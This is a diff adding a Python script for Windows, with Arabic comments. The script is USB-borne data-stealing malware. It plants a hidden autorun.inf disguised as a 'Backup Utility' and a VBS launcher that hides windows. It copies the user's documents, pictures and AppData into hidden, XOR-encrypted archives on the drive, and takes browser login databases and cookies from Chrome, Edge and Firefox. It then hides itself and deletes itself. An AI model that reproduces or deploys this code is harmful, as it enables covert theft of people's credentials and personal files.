@@ -1,0 +1,207 @@
+import os
+import sys
+import shutil
+import winreg
+import subprocess
+import threading
+import zipfile
+import zlib
+from ctypes import windll, create_unicode_buffer
+import sqlite3
+import win32api
+import win32con
+import win32security
+import pywintypes
+
+# Constants for file attributes
+HIDDEN = 0x02
+SYSTEM = 0x04
+
+# Encryption key (in real use, generate dynamically)
+ENCRYPTION_KEY = b'secret_key_1234567890!@#$%^'
+
+def get_usb_serial():
+    """استخراج السيريال الفريد لمحرك USB"""
+    drive = os.path.splitdrive(sys.argv[0])[0]
+    volume_info = create_unicode_buffer(1024)
+    fs_name = create_unicode_buffer(1024)
+    serial_num = winreg.DWORD()
+    max_component_len = winreg.DWORD()
+    file_system_flags = winreg.DWORD()
+    
+    windll.kernel32.GetVolumeInformationW(
+        drive,
+        volume_info,
+        len(volume_info),
+        serial_num,
+        max_component_len,
+        file_system_flags,
+        fs_name,
+        len(fs_name)
+    )
+    return f"{serial_num.value:X}"
+
+def get_system_folders():
+    """استخراج مسارات المجلدات الحساسة باستخدام واجهات نظام متقدمة"""
+    folders = {}
+    known_folders = {
+        'Pictures': win32con.CSIDL_MYPICTURES,
+        'Documents': win32con.CSIDL_MYDOCUMENTS,
+        'Downloads': win32con.CSIDL_DOWNLOADS,
+        'Desktop': win32con.CSIDL_DESKTOP,
+        'AppData': win32con.CSIDL_APPDATA
+    }
+    
+    for name, csidl in known_folders.items():
+        try:
+            buf = win32api.GetModuleFileName(0)
+            pidl = win32api.SHGetSpecialFolderLocation(0, csidl)
+            path = win32api.SHGetPathFromIDList(pidl)
+            folders[name] = path
+        except pywintypes.error:
+            folders[name] = os.path.join(os.environ['USERPROFILE'], name)
+    
+    return folders
+
+def set_hidden(file_path):
+    """تعيين سمات الملف المخفية والنظامية"""
+    windll.kernel32.SetFileAttributesW(file_path, HIDDEN | SYSTEM)
+
+def compress_and_encrypt(src, dst):
+    """ضغط وتشفير البيانات باستخدام تقنيات متقدمة"""
+    try:
+        # إنشاء أرشيف مضغوط
+        zip_path = f"{dst}.tmp"
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
+            for root, dirs, files in os.walk(src):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, src)
+                    zipf.write(file_path, arcname)
+        
+        # تشفير الملف المضغوط
+        with open(zip_path, 'rb') as f:
+            data = f.read()
+        encrypted = bytearray()
+        for i in range(len(data)):
+            encrypted.append(data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)])
+        
+        # حفظ الملف النهائي
+        with open(dst, 'wb') as f:
+            f.write(encrypted)
+        
+        os.remove(zip_path)
+        set_hidden(dst)
+        return True
+    except Exception as e:
+        return False
+
+def setup_autorun(drive):
+    """تهيئة آلية التشغيل التلقائي المتطورة"""
+    autorun_content = f'''[autorun]
+icon=drive.ico
+open=wscript.exe invisible.vbs backup.exe
+action=Backup Utility
+shell\\open\\command=wscript.exe invisible.vbs backup.exe
+shellexecute=backup.exe
+'''
+    autorun_path = os.path.join(drive, 'autorun.inf')
+    with open(autorun_path, 'w') as f:
+        f.write(autorun_content)
+    set_hidden(autorun_path)
+
+def create_invisible_vbs():
+    """إنشاء سكريبت إخفاء متطور"""
+    vbs_content = '''Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run Chr(34) & WScript.Arguments(0) & Chr(34), 0, False
+Set WshShell = Nothing'''
+    with open('invisible.vbs', 'w') as f:
+        f.write(vbs_content)
+    set_hidden('invisible.vbs')
+
+def steal_browser_data():
+    """سرقة بيانات المتصفحات الشائعة"""
+    serial = get_usb_serial()
+    target_dir = os.path.join(os.path.splitdrive(sys.argv[0])[0], f"sysdata_{serial}")
+    os.makedirs(target_dir, exist_ok=True)
+    
+    browsers = {
+        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
+        'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
+        'Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
+    }
+    
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            db_files = []
+            for root, _, files in os.walk(path):
+                for file in files:
+                    if file.endswith('.sqlite') or file == 'Login Data' or file == 'Cookies':
+                        db_files.append(os.path.join(root, file))
+            
+            for db_file in db_files:
+                try:
+                    shutil.copy2(db_file, os.path.join(target_dir, f"{name}_{os.path.basename(db_file)}"))
+                except:
+                    continue
+
+def main():
+    """النقطة الرئيسية للتنفيذ"""
+    # تهيئة البيئة
+    drive = os.path.splitdrive(sys.argv[0])[0]
+    serial = get_usb_serial()
+    backup_dir = os.path.join(drive, f"Backup_{serial}")
+    os.makedirs(backup_dir, exist_ok=True)
+    set_hidden(backup_dir)
+    
+    # إنشاء ملفات النظام
+    create_invisible_vbs()
+    setup_autorun(drive)
+    
+    # الحصول على المجلدات النظامية
+    folders = get_system_folders()
+    
+    # نسخ متعدد الخيوط
+    threads = []
+    for name, path in folders.items():
+        if os.path.exists(path):
+            t = threading.Thread(
+                target=compress_and_encrypt,
+                args=(path, os.path.join(backup_dir, f"{name}_{serial}.enc"))
+            )
+            t.start()
+            threads.append(t)
+    
+    # سرقة بيانات المتصفح في خيط منفصل
+    browser_thread = threading.Thread(target=steal_browser_data)
+    browser_thread.start()
+    threads.append(browser_thread)
+    
+    # انتظار انتهاء جميع المهام
+    for t in threads:
+        t.join()
+    
+    # إخفاء الذات
+    set_hidden(sys.argv[0])
+    
+    # التدمير الذاتي للآثار
+    if hasattr(sys, '_MEIPASS'):
+        bat_content = f'''
+@echo off
+timeout /t 3 /nobreak >nul
+del /f /q "{sys.argv[0]}"
+del /f /q "%~f0"
+'''
+        with open('cleanup.bat', 'w') as f:
+            f.write(bat_content)
+        subprocess.Popen(['wscript.exe', 'invisible.vbs', 'cleanup.bat'], 
+                         creationflags=subprocess.CREATE_NO_WINDOW)
+
+if __name__ == '__main__':
+    # إخفاء النافذة عند التشغيل
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = win32con.SW_HIDE
+    subprocess.Popen(['wscript.exe', 'invisible.vbs', sys.argv[0]], 
+                     startupinfo=startupinfo,
+                     creationflags=subprocess.CREATE_NO_WINDOW)
